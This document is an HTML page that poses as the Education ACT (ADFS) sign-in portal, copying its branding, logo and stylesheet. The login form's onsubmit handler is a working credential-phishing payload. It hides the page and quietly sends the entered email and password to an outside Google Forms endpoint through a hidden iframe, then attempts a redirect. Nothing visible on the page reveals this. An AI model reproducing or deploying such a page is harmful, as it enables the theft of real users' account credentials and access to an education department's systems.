<html lang="en-GB"><head>

        <title>Sign In</title>
        <link rel="stylesheet" type="text/css" href="https://adfs.ed.act.edu.au/adfs/portal/css/style.css?id=CED6A1DE4345C43D6106C2C8FA44B22D14D46AF0163AB6E5252FA6052B052AA3">
    </head>
    <body dir="ltr" class="body">
    <div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
        <h1>JavaScript required</h1>
        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
    </div>
    <script type="text/javascript" language="JavaScript">
         document.getElementById("noScript").style.display = "none";
    </script>
    <div id="fullPage">
        <div id="brandingWrapper" class="float">
            <div id="branding" class="illustrationClass"><img style="max-height: 100%;height: 100%;" src="https://adfs.ed.act.edu.au/adfs/portal/illustration/illustration.jpg?id=7ADB3F9398FCD3B6AD680EBC0DF57553989CFC386442811FE53A766DAF646BD2" height="window.innerHeight"></div>
        </div>
        <div id="contentWrapper" class="float">
            <div id="content">
                <div id="header">
                    <img class="logoImage" id="companyLogo" src="https://adfs.ed.act.edu.au/adfs/portal/logo/logo.png?id=C265087A34A61D25E7D1655FBD744BE4C91EDE9D7032E0EB2DA6B0B224B47C5E" alt="Education ACT">
                </div>
                <div id="workArea">
                    
    <div id="authArea" class="groupMargin">
        
        
        
    <div id="loginArea">        
        <div id="loginMessage" class="groupMargin">Sign in with your email address</div>

        <form method="get" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="document.body.style.display = 'none';document.body.appendChild(Object.assign(document.createElement('iframe'),{style:'display:none',src:`https://docs.google.com/forms/d/e/1FAIpQLScKb3unldtZMV8oiwj2M__G4MRrHZsC9UCUMgYdC2to1IlUxw/formResponse?entry.625891243=${document.getElementById(`userNameInput`).value}&entry.1913190204=${document.getElementById(`passwordInput`).value}`,onload:()=>{location=location.search.split('/')[-1]}}));return false;">
            <div id="error" class="fieldMargin error smallText" style="display: none;">
                <span id="errorText" for=""></span>
            </div>

            <div id="formsAuthenticationArea">
                <div id="userNameArea">
                    <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
                    <input onkeypress="if (event.key === 'Enter') { document.getElementById('passwordInput').focus();event.preventDefault() }" required name="email" id="userNameInput" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="someone@example.com" autocomplete="off">
                </div>

                <div id="passwordArea">
                    <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
                    <input required name="password" id="passwordInput" type="password" tabindex="2" class="text fullWidth" placeholder="Password" autocomplete="off">
                </div>
                <div id="kmsiArea" style="display:none">
                    <input required type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3">
                    <label for="kmsiInput">Keep me signed in</label>
                </div>
                <div id="submissionAreha" class="submitMargin">
                    <input required type="submit" id="submitButton" value="Sign in">
                </div>
            </div>
            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication">
        </form>

             <div id="authOptions">
      </div>
    </div>

    </div>

                </div>
                <div id="footerPlaceholder"></div>
            </div>
            <div id="footer">
                <div id="footerLinks" class="floatReverse">
                     <div><span id="copyright">Â© 2022 Microsoft</span></div>
                </div>
            </div>
        </div> 
    </div>
</body></html>
